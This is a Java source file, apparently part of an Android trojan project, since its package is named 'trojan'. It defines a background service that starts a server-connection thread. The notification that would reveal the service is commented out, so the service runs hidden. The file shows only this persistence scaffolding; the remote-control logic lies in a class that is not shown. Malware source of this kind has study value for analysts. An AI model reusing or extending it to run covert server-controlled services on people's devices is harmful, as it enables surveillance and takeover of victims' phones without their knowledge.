package trojan.android.android_trojan.action;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;


public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";

    //private ConnectionServerTask connectionServerTask;
    private Thread connectionServerThread;
    private ConnectionServerThread runnable;
    //private int notificationid = 1;
    //private NotificationManager notificationManager;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate");
        //connectionServerTask = new ConnectionServerTask(getApplicationContext());
        runnable = new ConnectionServerThread(getApplicationContext());
        connectionServerThread = new Thread(runnable);
        //notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //showNotification();
        //if (connectionServerTask.isCancelled() ||
        //        !connectionServerTask.getStatus().toString().equals("RUNNING"))
        //    connectionServerTask.execute();
        connectionServerThread.start();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //connectionServerTask.cancel(true);
        //notificationManager.cancel(notificationid);
        Log.d(TAG, "onDestroy");
        runnable.cancel();
        //if (Tools.isMyServiceRunning(NotificationService.class, getApplicationContext()))
        //    startService(new Intent(this, NotificationService.class));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /*
    private void showNotification(){
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.ic_launcher)
                        .setContentTitle(getString(R.string.app_name))
                        .setContentText("Service running")
                        .setAutoCancel(true);


        Intent resultIntent = new Intent(this, NotificationService.class);
        resultIntent.addFlags(resultIntent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent resultPendingIntent = PendingIntent.getService(this, 0, resultIntent, 0);

        mBuilder.setContentIntent(resultPendingIntent);

        Notification notification = mBuilder.build();
        notification.flags = Notification.FLAG_NO_CLEAR | Notification.FLAG_ONGOING_EVENT;
        notificationManager.notify(notificationid, notification);
    }*/
}
